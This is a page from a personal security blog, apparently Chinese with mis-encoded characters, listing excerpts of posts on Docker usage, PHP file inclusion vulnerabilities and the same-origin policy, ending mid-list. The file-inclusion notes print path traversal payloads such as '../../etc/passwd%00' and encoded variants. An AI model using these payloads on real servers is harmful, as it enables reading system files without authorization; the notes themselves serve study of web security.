<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Page 18 | ğŸ˜Š#</title>
  <meta name="author" content="JKme">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="ğŸ˜Š#"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  

  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
  <script src="/js/jquery-2.0.3.min.js"></script>
<!--   <script src="/js/highlight.min.js"></script>
  <script>hljs.highlightAll();</script>
  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="ğŸ˜Š#" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">ğŸ˜Š#</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/project" title="All the categories.">
			  <i class=""></i>Projects
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-rss"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>ğŸ˜Š#<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		wubba lubba dub dub.

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/10/08/docker.html" >Dockerç¬”è®°</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-10-08  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<ul>
<li>Docker container(å®¹å™¨): åº”ç”¨åœ¨å†…éƒ¨è·‘ï¼Œæœ‰è‡ªå·±å®Œæ•´çš„æ–‡ä»¶ç³»ç»Ÿå’Œæ“ä½œç³»ç»Ÿã€‚</li>
<li>Docker image(é•œåƒ): åº”ç”¨ä»£ç å„ç§åº“å’Œæ–‡ä»¶æ‰“åŒ…ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™ä¸ªå°±æ˜¯imageï¼Œéœ€è¦åŠ è½½åˆ°å®¹å™¨æ‰èƒ½è¿è¡Œã€‚</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> info  <span class="token comment">#åˆ—å‡ºcontainerå’Œimageçš„æ•°é‡ï¼Œå®¿ä¸»æ“ä½œç³»ç»Ÿç­‰</span>

<span class="token function">docker</span> run -t -i ubuntu /bin/bash
<span class="token comment">#run è¿è¡Œä¸€ä¸ªå®¹å™¨ï¼Œ-t åˆ›é€ ä¸€ä¸ªä¼ªTTY, -iè¡¨ç¤ºå§STDINæ‰“å¼€ï¼Œè¿™ä¸¤ä¸ªå‚æ•°æ˜¯è®©ç»ˆç«¯å¯ç”¨ï¼Œubuntuæ˜¯æŒ‡é•œåƒåï¼Œ/bin/bashæ˜¯è¦è¿è¡Œçš„å‘½ä»¤ã€‚exitæˆ–è€…Ctrl+d é€€å‡º</span>

<span class="token function">docker</span> <span class="token function">ps</span> -a <span class="token comment">#æŸ¥çœ‹æœ‰å“ªäº›å®¹å™¨åœ¨è¿è¡Œ</span>

<span class="token function">docker</span> start e0521aa52895 <span class="token comment">#å¯åŠ¨é‚£ä¸ªå®¹å™¨</span>
<span class="token function">docker</span> attach e0521aa52895 <span class="token comment">#å†æ¬¡ç™»å½•ä¸Šå»ï¼Œä¸èƒ½ç”¨runï¼Œå¦åˆ™ä¼šæ–°å»ºä¸€ä¸ªå®¹å™¨</span>

ä¸Šé¢ä¸¤ä¸ªå‘½ä»¤ç”¨ä¸€ä¸ªå‘½ä»¤ä»£æ›¿ï¼š
<span class="token function">docker</span> start -a -i e0521aa52895
<span class="token comment"># -a è¡¨ç¤ºattachï¼Œ -i è¡¨ç¤ºå¼€å¯stdin</span>

å¦‚æœæƒ³å¤šè¿shellï¼Œattachå‘½ä»¤ä¼šå¡ï¼Œå¯ä»¥ç”¨execè®©è¿™ä¸ªå®¹å™¨å†è¿è¡Œä¸€ä¸ªbash
<span class="token function">docker</span> <span class="token builtin class-name">exec</span> -i -t e0521aa52895 /bin/bash

<span class="token function">docker</span> <span class="token function">rm</span> e0521aa52895 <span class="token comment">#åˆ é™¤å®¹å™¨</span>
<span class="token function">docker</span> <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> -q -f <span class="token assign-left variable">status</span><span class="token operator">=</span>exited<span class="token variable">)</span></span>d
<span class="token comment">#åˆ é™¤æ‰€æœ‰é€€å‡ºçŠ¶æ€çš„å®¹å™¨</span>

<span class="token function">docker</span> run -it -p <span class="token number">8888</span>:80 imagine10255/centos6-lnmp-php56
<span class="token comment">#lnmpçš„80ç«¯å£æ˜ å°„åˆ°8888ç«¯å£ï¼Œå¹¶ä¸”å¼€å¯ä¸€ä¸ªäº¤äº’çš„shell</span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘æƒ³è¦dockeråœ¨åå°è¿è¡Œï¼Œæ¯æ¬¡éƒ½å¯ä»¥è¿›å»ä¿®æ”¹ä¸€äº›ä¸œè¥¿ï¼Œä½†æ˜¯æŸ¥äº†èµ„æ–™ä¸å¤ªå¦‚æ„ï¼Œdockeråå°è¿è¡Œçš„æ—¶å€™ï¼Œä»–é‡Œé¢å¿…é¡»è¦æœ‰ä¸€ä¸ªç¨‹åºä¸€ç›´åœ¨è¿è¡Œã€‚ä¸ºäº†å·æ‡’æˆ‘ç”¨äº†screenï¼Œç„¶å<code>docker run -it -p 8888:80 --name web  imagine10255/centos6-lnmp-php56</code>ï¼Œè¿™æ ·é€€å‡ºä¹‹åä½¿ç”¨<code>docker exec -t -i 35f89fd74804 /bin/bash</code>ã€‚çªç„¶æ„Ÿè§‰å¥½æ–¹ä¾¿=ã€‚=</p>
<pre class="line-numbers language-none"><code class="language-none">ç»™dockerèµ·ä¸€ä¸ªåå­—ä¹‹åå¯ä»¥è¿™æ ·æ‰§è¡Œå‘½ä»¤
docker exec web ls
docker start web
docker port web<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>dockerä¿®æ”¹äº†éƒ¨åˆ†æ–‡ä»¶ä¹‹åå¯ä»¥å…ˆé€€å‡ºï¼Œä½¿å¾—dockerçš„containeræ˜¯exitedçŠ¶æ€ï¼Œç„¶ådocker commit 3d1d1748aaeb web è¿™æ ·ä¿å­˜ï¼Œä¸‹æ¬¡ç›´æ¥è¿è¡Œwebè¿™ä¸ªimageså³å¯ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">docker save IMAGENAMW |bazip2 -9 -c &gt; img.tar.bz2
bzip2 -d -c &lt; img.tar.bz2 |docker load


docker export &lt;container id&gt; |bzip2 -9 -c &gt; img.tar.bz2
bzip2 -d -c &lt; img.tar.bz2 | docker import - name&#x2F;versio:tag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç°åœ¨åšä¸€ä¸ªlnmpçš„dockerï¼Œä½¿ç”¨ubuntu12.04,lnmp1.3ç‰ˆæœ¬ï¼Œdockerfileå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">FROM ubuntu:12.04

ENV ROOT_PATH &#x2F;root
RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install axel -y &amp;&amp; apt-get install net-tools -y
WORKDIR $ROOT_PATH
RUN axel ftp:&#x2F;&#x2F;soft.vpser.net&#x2F;lnmp&#x2F;lnmp1.3-full.tar.gz &amp;&amp; tar zxvf lnmp1.3-full.tar.gz &amp;&amp; cd lnmp1.3-full
WORKDIR &#x2F;root&#x2F;lnmp1.3-full
RUN echo -e 8e17f72 | bash install.sh


EXPOSE 80 3306 9000
CMD [&quot;bash&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code> docker build -t user/lnmp:tag  .</code>ï¼Œåœ¨vpsä¸Šé¢ç­‰ç­‰å°±okï¼Œæœ€åå¯ä»¥çœ‹åˆ°æ–°ç”Ÿæˆçš„imagesï¼Œ<code>docker start -it IMAGEID bash</code>åˆ é™¤ä¸€äº›ä¸œè¥¿ï¼Œmysqlè¿›ä¸å»å¯ä»¥è¿™æ ·ä¿®æ”¹</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;init.d&#x2F;mysql stop
mysqld_safe --user&#x3D;mysql --skip-grant-tables --skip-networking &amp;
mysql -uroot -p

update user set Password&#x3D;PASSWORD(&#39;newpassword&#39;) where USER&#x3D;&#39;root&#39;
FLUSH PRIVILEGES;
quit
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2016/10/08/docker.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<ul>
<li>Docker container(å®¹å™¨): åº”ç”¨åœ¨å†…éƒ¨è·‘ï¼Œæœ‰è‡ªå·±å®Œæ•´çš„æ–‡ä»¶ç³»ç»Ÿå’Œæ“ä½œç³»ç»Ÿã€‚</li>
<li>Docker image(é•œåƒ): åº”ç”¨ä»£ç å„ç§åº“å’Œæ–‡ä»¶æ‰“åŒ…ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™ä¸ªå°±æ˜¯imageï¼Œéœ€è¦åŠ è½½åˆ°å®¹å™¨æ‰èƒ½è¿è¡Œã€‚</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> info  <span class="token comment">#åˆ—å‡ºcontainerå’Œimageçš„æ•°é‡ï¼Œå®¿ä¸»æ“ä½œç³»ç»Ÿç­‰</span>

<span class="token function">docker</span> run -t -i ubuntu /bin/bash
<span class="token comment">#run è¿è¡Œä¸€ä¸ªå®¹å™¨ï¼Œ-t åˆ›é€ ä¸€ä¸ªä¼ªTTY, -iè¡¨ç¤ºå§STDINæ‰“å¼€ï¼Œè¿™ä¸¤ä¸ªå‚æ•°æ˜¯è®©ç»ˆç«¯å¯ç”¨ï¼Œubuntuæ˜¯æŒ‡é•œåƒåï¼Œ/bin/bashæ˜¯è¦è¿è¡Œçš„å‘½ä»¤ã€‚exitæˆ–è€…Ctrl+d é€€å‡º</span>

<span class="token function">docker</span> <span class="token function">ps</span> -a <span class="token comment">#æŸ¥çœ‹æœ‰å“ªäº›å®¹å™¨åœ¨è¿è¡Œ</span>

<span class="token function">docker</span> start e0521aa52895 <span class="token comment">#å¯åŠ¨é‚£ä¸ªå®¹å™¨</span>
<span class="token function">docker</span> attach e0521aa52895 <span class="token comment">#å†æ¬¡ç™»å½•ä¸Šå»ï¼Œä¸èƒ½ç”¨runï¼Œå¦åˆ™ä¼šæ–°å»ºä¸€ä¸ªå®¹å™¨</span>

ä¸Šé¢ä¸¤ä¸ªå‘½ä»¤ç”¨ä¸€ä¸ªå‘½ä»¤ä»£æ›¿ï¼š
<span class="token function">docker</span> start -a -i e0521aa52895
<span class="token comment"># -a è¡¨ç¤ºattachï¼Œ -i è¡¨ç¤ºå¼€å¯stdin</span>

å¦‚æœæƒ³å¤šè¿shellï¼Œattachå‘½ä»¤ä¼šå¡ï¼Œå¯ä»¥ç”¨execè®©è¿™ä¸ªå®¹å™¨å†è¿è¡Œä¸€ä¸ªbash
<span class="token function">docker</span> <span class="token builtin class-name">exec</span> -i -t e0521aa52895 /bin/bash

<span class="token function">docker</span> <span class="token function">rm</span> e0521aa52895 <span class="token comment">#åˆ é™¤å®¹å™¨</span>
<span class="token function">docker</span> <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> -q -f <span class="token assign-left variable">status</span><span class="token operator">=</span>exited<span class="token variable">)</span></span>d
<span class="token comment">#åˆ é™¤æ‰€æœ‰é€€å‡ºçŠ¶æ€çš„å®¹å™¨</span>

<span class="token function">docker</span> run -it -p <span class="token number">8888</span>:80 imagine10255/centos6-lnmp-php56
<span class="token comment">#lnmpçš„80ç«¯å£æ˜ å°„åˆ°8888ç«¯å£ï¼Œå¹¶ä¸”å¼€å¯ä¸€ä¸ªäº¤äº’çš„shell</span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘æƒ³è¦dockeråœ¨åå°è¿è¡Œï¼Œæ¯æ¬¡éƒ½å¯ä»¥è¿›å»ä¿®æ”¹ä¸€äº›ä¸œè¥¿ï¼Œä½†æ˜¯æŸ¥äº†èµ„æ–™ä¸å¤ªå¦‚æ„ï¼Œdockeråå°è¿è¡Œçš„æ—¶å€™ï¼Œä»–é‡Œé¢å¿…é¡»è¦æœ‰ä¸€ä¸ªç¨‹åºä¸€ç›´åœ¨è¿è¡Œã€‚ä¸ºäº†å·æ‡’æˆ‘ç”¨äº†screenï¼Œç„¶å<code>docker run -it -p 8888:80 --name web  imagine10255/centos6-lnmp-php56</code>ï¼Œè¿™æ ·é€€å‡ºä¹‹åä½¿ç”¨<code>docker exec -t -i 35f89fd74804 /bin/bash</code>ã€‚çªç„¶æ„Ÿè§‰å¥½æ–¹ä¾¿=ã€‚=</p>
<pre class="line-numbers language-none"><code class="language-none">ç»™dockerèµ·ä¸€ä¸ªåå­—ä¹‹åå¯ä»¥è¿™æ ·æ‰§è¡Œå‘½ä»¤
docker exec web ls
docker start web
docker port web<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>dockerä¿®æ”¹äº†éƒ¨åˆ†æ–‡ä»¶ä¹‹åå¯ä»¥å…ˆé€€å‡ºï¼Œä½¿å¾—dockerçš„containeræ˜¯exitedçŠ¶æ€ï¼Œç„¶ådocker commit 3d1d1748aaeb web è¿™æ ·ä¿å­˜ï¼Œä¸‹æ¬¡ç›´æ¥è¿è¡Œwebè¿™ä¸ªimageså³å¯ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">docker save IMAGENAMW |bazip2 -9 -c &gt; img.tar.bz2
bzip2 -d -c &lt; img.tar.bz2 |docker load


docker export &lt;container id&gt; |bzip2 -9 -c &gt; img.tar.bz2
bzip2 -d -c &lt; img.tar.bz2 | docker import - name&#x2F;versio:tag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç°åœ¨åšä¸€ä¸ªlnmpçš„dockerï¼Œä½¿ç”¨ubuntu12.04,lnmp1.3ç‰ˆæœ¬ï¼Œdockerfileå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">FROM ubuntu:12.04

ENV ROOT_PATH &#x2F;root
RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install axel -y &amp;&amp; apt-get install net-tools -y
WORKDIR $ROOT_PATH
RUN axel ftp:&#x2F;&#x2F;soft.vpser.net&#x2F;lnmp&#x2F;lnmp1.3-full.tar.gz &amp;&amp; tar zxvf lnmp1.3-full.tar.gz &amp;&amp; cd lnmp1.3-full
WORKDIR &#x2F;root&#x2F;lnmp1.3-full
RUN echo -e 8e17f72 | bash install.sh


EXPOSE 80 3306 9000
CMD [&quot;bash&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code> docker build -t user/lnmp:tag  .</code>ï¼Œåœ¨vpsä¸Šé¢ç­‰ç­‰å°±okï¼Œæœ€åå¯ä»¥çœ‹åˆ°æ–°ç”Ÿæˆçš„imagesï¼Œ<code>docker start -it IMAGEID bash</code>åˆ é™¤ä¸€äº›ä¸œè¥¿ï¼Œmysqlè¿›ä¸å»å¯ä»¥è¿™æ ·ä¿®æ”¹</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;init.d&#x2F;mysql stop
mysqld_safe --user&#x3D;mysql --skip-grant-tables --skip-networking &amp;
mysql -uroot -p

update user set Password&#x3D;PASSWORD(&#39;newpassword&#39;) where USER&#x3D;&#39;root&#39;
FLUSH PRIVILEGES;
quit
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2016/10/08/docker.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/09/25/whitehat-talk-web-security.html" >ã€Šç™½å¸½å­è®²Webå®‰å…¨ã€‹</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-09-25  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆFile-Inclusionï¼‰"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆFile-Inclusionï¼‰" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆFile Inclusionï¼‰"></a>æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆFile Inclusionï¼‰</h3><p>æ–‡ä»¶åŒ…å«å¯èƒ½ä¼šå‡ºç°åœ¨JSPã€PHPã€ASPç­‰è¯­è¨€ä¸­ï¼Œå¸¸è§çš„å‡½æ•°å¦‚ä¸‹ï¼š<br><code>PHP: include()ã€include_once()ã€require()ã€require_once()ã€fopen()ã€readfile()</code></p>
<p>æ–‡ä»¶åŒ…å«æ˜¯PHPçš„ä¸€ç§å¸¸è§ç”¨æ³•ï¼Œä¸»è¦ç”±å››ä¸ªå‡½æ•°ç»„æˆï¼š</p>
<ul>
<li>include()</li>
<li>require()</li>
<li>include_onec()</li>
<li>require_once()</li>
</ul>
<p>å½“ä½¿ç”¨è¿™4ä¸ªå‡½æ•°åŒ…å«ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å°†ä½œä¸ºPHPä»£ç æ‰§è¡Œï¼ŒPHPå†…æ ¸å¹¶ä¸ä¼šåœ¨æ„è¢«åŒ…å«çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹ã€‚</p>
<p>æ‰€ä»¥å¦‚æœè¢«åŒ…å«çš„æ˜¯txtæ–‡ä»¶ï¼Œå›¾ç‰‡æ–‡ä»¶ï¼Œè¿œç¨‹URLç­‰éƒ½ä¼šä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚</p>
<p>èƒ½å¤Ÿæ‰“å¼€å¹¶ä¸”åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ç§°ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆLocal File Inclusionï¼ŒLFIï¼‰</p>
<p>PHPè¯­è¨€æ˜¯ç”±Cè¯­è¨€å®ç°çš„ï¼Œå› æ­¤ä½¿ç”¨äº†Cè¯­è¨€ä¸­ä¸€äº›å­—ç¬¦ä¸²å¤„ç†å‡½æ•°ï¼Œåœ¨è¿æ¥å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œ0å­—èŠ‚ï¼ˆ\x00ï¼‰è®²ä½œä¸ºå­—ç¬¦ä¸²ç»“æŸç¬¦ã€‚æ‰€ä»¥æ”»å‡»è€…å¯ä»¥åŠ ä¸€ä¸ª0å­—èŠ‚ï¼Œæˆªæ–­fileå˜é‡åé¢çš„å­—ç¬¦ä¸²ï¼Œå³<br><code>../../etc/passwd\0</code>ï¼Œåœ¨getè¯·æ±‚çš„æ—¶å€™è¿›è¡ŒUrlencodeï¼Œå˜æˆ<code>../../etc/passwd%00</code>ã€‚</p>
<p>å¦‚æœç¦ç”¨äº†0å­—èŠ‚å¯ä»¥åˆ©ç”¨æ“ä½œç³»ç»Ÿå¯¹ç›®å½•æœ€å¤§é•¿åº¦çš„é™åˆ¶ï¼Œå¯ä»¥ä¸éœ€è¦0å­—èŠ‚è€Œè¾¾åˆ°æˆªæ–­çš„ç›®çš„ã€‚ç›®å½•å­—ç¬¦ä¸²ï¼Œåœ¨windowsä¸‹256å­—èŠ‚ï¼ŒLinuxä¸‹4096å­—èŠ‚ä¼šè¾¾åˆ°æœ€å¤§å€¼ï¼Œæœ€å¤§å€¼é•¿åº¦ä¹‹åçš„å­—ç¬¦ä¸²å°†ä¼šè¢«ä¸¢å¼ƒã€‚å¯ä»¥é€šè¿‡å¦‚ä¸‹æ„é€ :<br><code>../../../../../../../../../../../../../../abc</code></p>
<ul>
<li>%2e%2e%2f ç­‰åŒäº ../</li>
<li>%2e%2e/ åŒä¸Š</li>
<li>..%2f åŒä¸Š</li>
<li>%2e%2e%5c ..\</li>
<li>%252%252%255cç­‰åŒäº..\</li>
</ul>
	

	</div>
  <a type="button" href="/2016/09/25/whitehat-talk-web-security.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆFile-Inclusionï¼‰"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆFile-Inclusionï¼‰" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆFile Inclusionï¼‰"></a>æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆFile Inclusionï¼‰</h3><p>æ–‡ä»¶åŒ…å«å¯èƒ½ä¼šå‡ºç°åœ¨JSPã€PHPã€ASPç­‰è¯­è¨€ä¸­ï¼Œå¸¸è§çš„å‡½æ•°å¦‚ä¸‹ï¼š<br><code>PHP: include()ã€include_once()ã€require()ã€require_once()ã€fopen()ã€readfile()</code></p>
<p>æ–‡ä»¶åŒ…å«æ˜¯PHPçš„ä¸€ç§å¸¸è§ç”¨æ³•ï¼Œä¸»è¦ç”±å››ä¸ªå‡½æ•°ç»„æˆï¼š</p>
<ul>
<li>include()</li>
<li>require()</li>
<li>include_onec()</li>
<li>require_once()</li>
</ul>
<p>å½“ä½¿ç”¨è¿™4ä¸ªå‡½æ•°åŒ…å«ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å°†ä½œä¸ºPHPä»£ç æ‰§è¡Œï¼ŒPHPå†…æ ¸å¹¶ä¸ä¼šåœ¨æ„è¢«åŒ…å«çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹ã€‚</p>
<p>æ‰€ä»¥å¦‚æœè¢«åŒ…å«çš„æ˜¯txtæ–‡ä»¶ï¼Œå›¾ç‰‡æ–‡ä»¶ï¼Œè¿œç¨‹URLç­‰éƒ½ä¼šä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚</p>
<p>èƒ½å¤Ÿæ‰“å¼€å¹¶ä¸”åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ç§°ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆLocal File Inclusionï¼ŒLFIï¼‰</p>
<p>PHPè¯­è¨€æ˜¯ç”±Cè¯­è¨€å®ç°çš„ï¼Œå› æ­¤ä½¿ç”¨äº†Cè¯­è¨€ä¸­ä¸€äº›å­—ç¬¦ä¸²å¤„ç†å‡½æ•°ï¼Œåœ¨è¿æ¥å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œ0å­—èŠ‚ï¼ˆ\x00ï¼‰è®²ä½œä¸ºå­—ç¬¦ä¸²ç»“æŸç¬¦ã€‚æ‰€ä»¥æ”»å‡»è€…å¯ä»¥åŠ ä¸€ä¸ª0å­—èŠ‚ï¼Œæˆªæ–­fileå˜é‡åé¢çš„å­—ç¬¦ä¸²ï¼Œå³<br><code>../../etc/passwd\0</code>ï¼Œåœ¨getè¯·æ±‚çš„æ—¶å€™è¿›è¡ŒUrlencodeï¼Œå˜æˆ<code>../../etc/passwd%00</code>ã€‚</p>
<p>å¦‚æœç¦ç”¨äº†0å­—èŠ‚å¯ä»¥åˆ©ç”¨æ“ä½œç³»ç»Ÿå¯¹ç›®å½•æœ€å¤§é•¿åº¦çš„é™åˆ¶ï¼Œå¯ä»¥ä¸éœ€è¦0å­—èŠ‚è€Œè¾¾åˆ°æˆªæ–­çš„ç›®çš„ã€‚ç›®å½•å­—ç¬¦ä¸²ï¼Œåœ¨windowsä¸‹256å­—èŠ‚ï¼ŒLinuxä¸‹4096å­—èŠ‚ä¼šè¾¾åˆ°æœ€å¤§å€¼ï¼Œæœ€å¤§å€¼é•¿åº¦ä¹‹åçš„å­—ç¬¦ä¸²å°†ä¼šè¢«ä¸¢å¼ƒã€‚å¯ä»¥é€šè¿‡å¦‚ä¸‹æ„é€ :<br><code>../../../../../../../../../../../../../../abc</code></p>
<ul>
<li>%2e%2e%2f ç­‰åŒäº ../</li>
<li>%2e%2e/ åŒä¸Š</li>
<li>..%2f åŒä¸Š</li>
<li>%2e%2e%5c ..\</li>
<li>%252%252%255cç­‰åŒäº..\</li>
</ul>
	
	</div>
  <a type="button" href="/2016/09/25/whitehat-talk-web-security.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/08/29/csrf.html" >CSRF</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-08-29  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h2 id="åŒæºç­–ç•¥"><a href="#åŒæºç­–ç•¥" class="headerlink" title="åŒæºç­–ç•¥"></a>åŒæºç­–ç•¥</h2><p>åŒæºç­–ç•¥(Same Origin policy, SOP)ï¼Œä¹Ÿç§°ä¸ºå•æºç­–ç•¥(Single Origin policy)ï¼Œç”¨äºWebæµè§ˆå™¨ç¼–ç¨‹è¯­è¨€çš„å®‰å…¨æªæ–½ï¼Œç”¨ä»¥ä¿æŠ¤ä¿¡æ¯çš„ä¿å¯†æ€§å’Œå®‰å…¨æ€§ã€‚åŒæºç­–ç•¥é˜²æ­¢ç½‘ç«™è„šæœ¬è®¿é—®å…¶ä»–ç«™ç‚¹ä½¿ç”¨è„šæœ¬ï¼Œä¹Ÿç»„ç»‡å®ƒä¸å…¶ä»–ç«™ç‚¹äº¤äº’ã€‚<br>åªè¦<strong>åè®®</strong>ã€<strong>ç«¯å£</strong>ã€<strong>ä¸»æœº</strong>ä¸‰ä¸ªæœ‰ä¸€ä¸ªä¸åŒ¹é…ï¼Œå°±æ˜¯è·¨åŸŸè¯·æ±‚ã€‚</p>
<p>å¦‚æœè¦è·¨åŸŸè¯·æ±‚ï¼Œæœ‰ä¸‹é¢çš„é™åˆ¶ï¼š</p>
<ul>
<li>ä»…å…è®¸GETã€HEADã€POSTè¯·æ±‚</li>
<li>ä»…å…è®¸æ‰‹åŠ¨è®¾ç½®Acceptã€Accept-Languageã€Content-Languageå’ŒContent-Typeå¤´</li>
<li>Content-Typeå¤´ä»…å…è®¸ä½¿ç”¨application/x-www-form-urlencoded,multipart/form-dataå’Œtext/plainè¿™ä¸‰ç§å€¼ã€‚</li>
</ul>
<p>æ»¡è¶³ä»¥ä¸Šä¸‰ä¸ªè¯·æ±‚çš„ï¼Œç§°ä¸ºsimple request<br>å½“ä¸Šé—¨çš„simple requestä¸èƒ½æ»¡è¶³ä½¿ç”¨åœºæ™¯çš„æ—¶å€™ï¼Œæœ‰ä»¥ä¸‹çš„è¯·æ±‚è§£å†³è·¨åŸŸé™åˆ¶ï¼Œéƒ½æ˜¯ä»¥<code>Access-Control-</code>å¼€å¤´ï¼Œæ¯”è¾ƒé‡è¦çš„æœ‰ï¼š</p>
<ul>
